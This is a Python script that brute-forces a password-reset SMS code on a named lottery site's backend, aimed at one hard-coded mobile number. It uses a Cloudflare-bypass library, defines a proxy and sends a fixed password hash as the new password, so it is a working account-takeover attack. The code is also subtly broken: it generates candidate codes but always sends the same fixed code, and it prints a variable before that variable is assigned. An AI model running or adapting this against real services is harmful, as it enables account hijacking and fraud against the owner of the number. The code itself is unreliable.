try:
    from os import system
    from time import sleep,time
    import cloudscraper
except:
    system('pip install cloudscraper')
    system('clear')
    import cloudscraper
scraper = cloudscraper.create_scraper()

proxies = {'http': 'http://128.199.214.87:3128','https': 'https://128.199.214.87:3128'}

while True:
    start_time = time()
    Mobile_no = '7827111160'
    #
    # scraper.get("https://Code.ankurkumar8.repl.co/Reset.php")
    # headers = {'Host': 'mantrimalls.com','User-Agent': 'Mozilla/5.0','Accept-Encoding': 'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded'}
    # params = (('mobile', f'+91{Mobile_no}'),)
    # req_otp = scraper.post('https://mantrimalls.com/lottery-backend/glserver/smsserver/getCode', headers=headers, params=params).json()["resMsg"]
    # print(Mobile_no,': ',req_otp)

    sleep(3)

    for i in range(5000):
        otp = str(i).zfill(4)
        headers = {'Host': 'mantrimalls.com','User-Agent': 'Mozilla/5.0','Accept-Encoding': 'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded'}
        params = (('mobile', f'+91{Mobile_no}'),('code', '8395'),('password', '25d55ad283aa400af464c76d713c07ad'),)
        rst_psd = scraper.post('https://mantrimalls.com/lottery-backend/glserver/user/fogetPSW', headers=headers, params=params)
        if str(rst_psd.json()["resMsg"]) == "SUCCESS":
            print('Success',Mobile_no,otp)
        else: print(rst_psd.json()["resMsg"],otp);print(elapsed)
        End_time = time()
        elapsed = (End_time - start_time) / 60
        if elapsed>=10:break
        sleep(1)


system('pause >nul')